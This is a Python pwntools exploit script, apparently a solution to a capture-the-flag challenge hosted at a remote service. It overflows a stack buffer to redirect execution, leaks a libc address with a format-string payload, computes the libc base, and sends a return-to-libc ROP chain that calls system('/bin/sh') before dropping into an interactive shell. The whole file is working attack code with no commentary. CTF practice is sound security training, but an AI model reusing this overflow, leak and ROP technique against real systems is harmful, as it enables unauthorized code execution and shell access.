from pwn import *
import time

libc = ELF('./libc.so.6')
r = remote('gold.b01le.rs', 4008)

r.recvuntil(b'be?')
r.recvline()
r.sendline(b'A'*64 + b'B'*8 + p64(0x401342) + b'A'*8 + p64(0x401292))

time.sleep(1)
r.sendline(b'%27$p%20$p')

leak = int(r.recvline()[9:9+12],16)
print(hex(leak))
print(hex(leak - 0x29E40))
libc.address = leak - 0x29E40

r.recvuntil(b'be?')
r.recvline()
r.sendline(b'A' * 72 + p64(libc.address+0x2a3e5) + p64(next(libc.search(b"/bin/sh\x00"))) + p64(libc.sym[b'system']))

r.interactive()
